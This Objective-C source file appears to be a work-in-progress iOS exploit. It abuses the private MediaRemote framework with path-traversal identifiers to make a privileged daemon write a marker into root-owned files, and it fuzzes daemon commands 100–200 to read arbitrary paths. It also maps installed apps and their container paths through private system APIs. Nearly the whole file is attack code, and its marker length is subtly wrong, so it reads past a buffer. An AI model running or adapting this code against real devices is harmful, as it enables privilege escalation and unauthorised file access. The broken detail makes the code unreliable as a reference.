//
//  dotdot.m
//  dotdot
//
//  Created by roooot on 03.08.26.
//  Copyright (C) 2026 roooot
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU Affero General Public License as published
//  by the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  You can find the full license text at:
//  https://www.gnu.org/licenses/agpl-3.0.html
//

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>

typedef void (^mr_res_t)(NSDictionary *);
typedef void (*mr_send_fn)(NSInteger, NSDictionary *, dispatch_queue_t, mr_res_t);

static mr_send_fn mr_fn(void) {
    static dispatch_once_t once;
    static mr_send_fn fn = NULL;
    dispatch_once(&once, ^{
        dlopen("/System/Library/PrivateFrameworks/MediaRemote.framework/MediaRemote", RTLD_NOW);
        fn = (mr_send_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteSendCommand");
    });
    return fn;
}

static NSData *tagged_field(int field, NSData *payload) {
    uint8_t tag = (field << 3) | 2;
    NSMutableData *d = [NSMutableData dataWithBytes:&tag length:1];
    uint64_t len = payload.length;
    while (len >= 0x80) { uint8_t b = (len & 0x7f) | 0x80; [d appendBytes:&b length:1]; len >>= 7; }
    uint8_t b = len; [d appendBytes:&b length:1]; [d appendData:payload];
    return d;
}

// writes successfully but cleanup deletes file after...
int dd_write(const char *identifier, const char *targetPath) {
    mr_send_fn fn = mr_fn();
    if (!fn) return 1;

    NSData *marker = [NSData dataWithBytes:"roooot_was_here\n" length:48];

    NSMutableData *proto = [NSMutableData dataWithData:tagged_field(1, marker)];
    [proto appendData:tagged_field(2, [[NSString stringWithUTF8String:identifier]
                                       dataUsingEncoding:NSUTF8StringEncoding])];

    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto },
       dispatch_get_main_queue(), ^(NSDictionary *r){});

    for (int i = 0; i < 3000000; i++) {
        struct stat st;
        if (stat(targetPath, &st) == 0 && st.st_uid == 0) {
            int fd = open(targetPath, O_RDONLY);
            if (fd >= 0) {
                char buf[256] = {0};
                ssize_t n = read(fd, buf, sizeof(buf) - 1);
                close(fd);
                if (n > 0) {
                    printf("(dd) written: uid=%d gid=%d mode=%o size=%lld\n",
                           st.st_uid, st.st_gid, st.st_mode & 07777, (long long)st.st_size);
                    printf("(dd) marker: %s", buf);
                    return 0;
                }
            }
        }
    }
    return 1;
}

// Fuzz commands 100-200 concurrently.
// Sends ONLY field 2 (path traversal), no write payload — probing whether
// the daemon reads from that path and echoes contents through the reply.
int dd_fuzz_read(const char *identifier, char *outBuf, size_t bufSize,
                 size_t *outLen, int *foundCmd) {
    mr_send_fn fn = mr_fn();
    if (!fn) return -1;

    NSData *identData = [[NSString stringWithUTF8String:identifier]
                         dataUsingEncoding:NSUTF8StringEncoding];
    NSData *proto = tagged_field(2, identData);

    __block NSData *hit   = nil;
    __block int    hitCmd = -1;
    NSLock        *lock   = [[NSLock alloc] init];

    dispatch_group_t group = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);

    for (int cmd = 100; cmd <= 200; cmd++) {
        dispatch_group_enter(group);
        int c = cmd;
        fn(c, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto }, q,
           ^(NSDictionary *r) {
               [lock lock];
               if (!hit) {
                   for (id key in r) {
                       id val = r[key];
                       NSData *bytes = nil;
                       if ([val isKindOfClass:[NSData class]] && ((NSData *)val).length > 4)
                           bytes = (NSData *)val;
                       else if ([val isKindOfClass:[NSString class]] && ((NSString *)val).length > 0)
                           bytes = [(NSString *)val dataUsingEncoding:NSUTF8StringEncoding];
                       if (bytes) {
                           hit    = bytes;
                           hitCmd = c;
                           printf("(dd_read) cmd=%d key=%s len=%zu\n",
                                  c, [[key description] UTF8String], bytes.length);
                           break;
                       }
                   }
               }
               [lock unlock];
               dispatch_group_leave(group);
           });
    }

    dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC));

    if (hit && hitCmd >= 0) {
        size_t n = MIN(hit.length, bufSize - 1);
        memcpy(outBuf, hit.bytes, n);
        outBuf[n] = '\0';
        if (outLen)   *outLen   = n;
        if (foundCmd) *foundCmd = hitCmd;
        return 0;
    }
    return -1;
}

// ── Container metadata plist key ─────────────────────────────────────────────
#define kMCMMetaId @"MCMMetadataIdentifier"

// ── Scan a container directory, return {bundleId -> path} ────────────────────
static void _scan_containers(NSString *base,
                             BOOL isBundleContainer,
                             NSMutableDictionary *idToPath,
                             NSMutableDictionary *idToName) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *uuids = [fm contentsOfDirectoryAtPath:base error:nil];
    if (!uuids) return;
    for (NSString *uuid in uuids) {
        NSString *dir  = [base stringByAppendingPathComponent:uuid];
        NSString *meta = [dir stringByAppendingPathComponent:
                          @".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *m = [NSDictionary dictionaryWithContentsOfFile:meta];
        NSString *bid   = m[kMCMMetaId];
        if (!bid || bid.length == 0) continue;

        if (!isBundleContainer) {
            // Data container: the dir itself is the container root
            if (!idToPath[bid]) idToPath[bid] = dir;
        } else {
            // Bundle container: find the .app inside, read Info.plist for name
            NSArray *items = [fm contentsOfDirectoryAtPath:dir error:nil];
            for (NSString *item in items) {
                if (![item hasSuffix:@".app"]) continue;
                NSString *appDir   = [dir stringByAppendingPathComponent:item];
                NSString *infoPlist = [appDir stringByAppendingPathComponent:@"Info.plist"];
                NSDictionary *info  = [NSDictionary dictionaryWithContentsOfFile:infoPlist];
                if (!idToPath[bid]) idToPath[bid] = appDir;
                if (!idToName[bid]) {
                    NSString *n = info[@"CFBundleDisplayName"] ?: info[@"CFBundleName"];
                    if (n) idToName[bid] = n;
                }
                break;
            }
        }
    }
}

// ── Enrich name/paths from LSApplicationProxy ─────────────────────────────────
static void _enrich_from_lap(NSArray *ids,
                              NSMutableDictionary *idToDataPath,
                              NSMutableDictionary *idToBundlePath,
                              NSMutableDictionary *idToName) {
    Class LAP = NSClassFromString(@"LSApplicationProxy");
    SEL proxyForId = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (!LAP || ![LAP respondsToSelector:proxyForId]) return;

    for (NSString *bid in ids) {
        id proxy = [LAP performSelector:proxyForId withObject:bid];
        if (!proxy) continue;

        if (!idToDataPath[bid]) {
            NSURL *u = [proxy respondsToSelector:@selector(dataContainerURL)]
                       ? [proxy performSelector:@selector(dataContainerURL)] : nil;
            if (u.path) idToDataPath[bid] = u.path;
        }
        if (!idToBundlePath[bid]) {
            NSURL *u = [proxy respondsToSelector:@selector(bundleURL)]
                       ? [proxy performSelector:@selector(bundleURL)] : nil;
            if (u.path) idToBundlePath[bid] = u.path;
        }
        if (!idToName[bid]) {
            NSString *n = [proxy respondsToSelector:@selector(localizedName)]
                          ? [proxy performSelector:@selector(localizedName)] : nil;
            if (n) idToName[bid] = n;
        }
    }
}

// ── Debug info ────────────────────────────────────────────────────────────────
NSString *dd_debug_info(void) {
    NSMutableString *s = [NSMutableString string];
    NSFileManager *fm = [NSFileManager defaultManager];

    // SBS
    void *sbsH = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);
    CFArrayRef (*SBSCopyIds)(BOOL) = sbsH ? dlsym(sbsH, "SBSCopyApplicationDisplayIdentifiers") : NULL;
    NSArray *sbsIds = nil;
    if (SBSCopyIds) {
        CFArrayRef cf = SBSCopyIds(NO);
        if (cf) sbsIds = (__bridge_transfer NSArray *)cf;
    }
    [s appendFormat:@"SBS ids: %lu\n", (unsigned long)(sbsIds.count)];

    // LAP
    Class LAP = NSClassFromString(@"LSApplicationProxy");
    SEL proxyForId = NSSelectorFromString(@"applicationProxyForIdentifier:");
    BOOL canProxy = LAP && [LAP respondsToSelector:proxyForId];
    [s appendFormat:@"LAP: %@\n", canProxy ? @"ok" : @"no"];
    if (canProxy && sbsIds.count > 0) {
        id proxy = [LAP performSelector:proxyForId withObject:sbsIds.firstObject];
        NSURL *du = proxy ? ([proxy respondsToSelector:@selector(dataContainerURL)]
                             ? [proxy performSelector:@selector(dataContainerURL)] : nil) : nil;
        [s appendFormat:@"LAP dataContainerURL: %@\n", du.path ?: @"nil"];
    }

    // Data container scan
    NSArray *dataBases = @[
        @"/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Data/Application"
    ];
    for (NSString *base in dataBases) {
        NSArray *uuids = [fm contentsOfDirectoryAtPath:base error:nil];
        [s appendFormat:@"Data scan %@: %lu\n", base, (unsigned long)(uuids.count)];
        if (uuids.count > 0) break;
    }

    // Bundle container scan
    NSArray *bundleBases = @[
        @"/var/containers/Bundle/Application",
        @"/private/var/containers/Bundle/Application"
    ];
    for (NSString *base in bundleBases) {
        NSArray *uuids = [fm contentsOfDirectoryAtPath:base error:nil];
        [s appendFormat:@"Bundle scan %@: %lu\n", base, (unsigned long)(uuids.count)];
        if (uuids.count > 0) break;
    }

    // Total from dd_installed_apps
    NSArray *apps = dd_installed_apps();
    NSUInteger withPath = 0;
    for (NSDictionary *a in apps) {
        if ([a[@"dataPath"] length] > 0) withPath++;
    }
    [s appendFormat:@"installed_apps total: %lu (with path: %lu)\n",
        (unsigned long)apps.count, (unsigned long)withPath];
    if (apps.count > 0) {
        NSDictionary *first = apps.firstObject;
        [s appendFormat:@"first: %@ | %@ | %@",
            first[@"name"], first[@"bundleId"], first[@"dataPath"]];
    }

    return [s copy];
}

// ── Installed apps ────────────────────────────────────────────────────────────
NSArray<NSDictionary<NSString *, NSString *> *> *dd_installed_apps(void) {
    NSMutableOrderedSet *allIds  = [NSMutableOrderedSet orderedSet];
    NSMutableDictionary *dataMap   = [NSMutableDictionary dictionary]; // bid -> dataPath
    NSMutableDictionary *bundleMap = [NSMutableDictionary dictionary]; // bid -> bundlePath
    NSMutableDictionary *nameMap   = [NSMutableDictionary dictionary]; // bid -> name

    // ── Source 1: SBS bundle IDs ──────────────────────────────────────────────
    void *sbsH = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);
    CFArrayRef (*SBSCopyIds)(BOOL) = sbsH
        ? dlsym(sbsH, "SBSCopyApplicationDisplayIdentifiers") : NULL;
    if (SBSCopyIds) {
        CFArrayRef cf = SBSCopyIds(NO);
        if (cf) {
            NSArray *ids = (__bridge_transfer NSArray *)cf;
            for (NSString *bid in ids)
                if (bid.length) [allIds addObject:bid];
        }
    }

    // ── Source 2: Data container filesystem scan ──────────────────────────────
    NSArray *dataBases = @[
        @"/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Data/Application"
    ];
    for (NSString *base in dataBases) {
        _scan_containers(base, NO, dataMap, nameMap);
        if (dataMap.count > 0) {
            for (NSString *bid in dataMap) [allIds addObject:bid];
            break;
        }
    }

    // ── Source 3: Bundle container filesystem scan ────────────────────────────
    NSArray *bundleBases = @[
        @"/var/containers/Bundle/Application",
        @"/private/var/containers/Bundle/Application"
    ];
    for (NSString *base in bundleBases) {
        _scan_containers(base, YES, bundleMap, nameMap);
        if (bundleMap.count > 0) {
            for (NSString *bid in bundleMap) [allIds addObject:bid];
            break;
        }
    }

    // ── Source 4: LSApplicationProxy enrichment ───────────────────────────────
    _enrich_from_lap(allIds.array, dataMap, bundleMap, nameMap);

    // ── Source 5: LSApplicationWorkspace selectors (last resort) ─────────────
    if (allIds.count == 0) {
        Class WSClass = NSClassFromString(@"LSApplicationWorkspace");
        id ws = WSClass ? [WSClass performSelector:@selector(defaultWorkspace)] : nil;
        for (NSString *selName in @[@"allInstalledApplications", @"allApplications"]) {
            SEL sel = NSSelectorFromString(selName);
            if (!ws || ![ws respondsToSelector:sel]) continue;
            NSArray *proxies = [ws performSelector:sel];
            for (id proxy in proxies) {
                NSString *bid = [proxy respondsToSelector:@selector(applicationIdentifier)]
                                ? [proxy performSelector:@selector(applicationIdentifier)] : nil;
                if (!bid.length) continue;
                [allIds addObject:bid];
            }
            _enrich_from_lap(allIds.array, dataMap, bundleMap, nameMap);
            if (allIds.count > 0) break;
        }
    }

    // ── Assemble result ───────────────────────────────────────────────────────
    NSMutableArray *result = [NSMutableArray arrayWithCapacity:allIds.count];
    for (NSString *bid in allIds) {
        [result addObject:@{
            @"name":       nameMap[bid]   ?: bid,
            @"bundleId":   bid,
            @"dataPath":   dataMap[bid]   ?: @"",
            @"bundlePath": bundleMap[bid] ?: @""
        }];
    }

    return [result sortedArrayUsingDescriptors:
            @[[NSSortDescriptor sortDescriptorWithKey:@"name" ascending:YES
                                             selector:@selector(localizedCaseInsensitiveCompare:)]]];
}
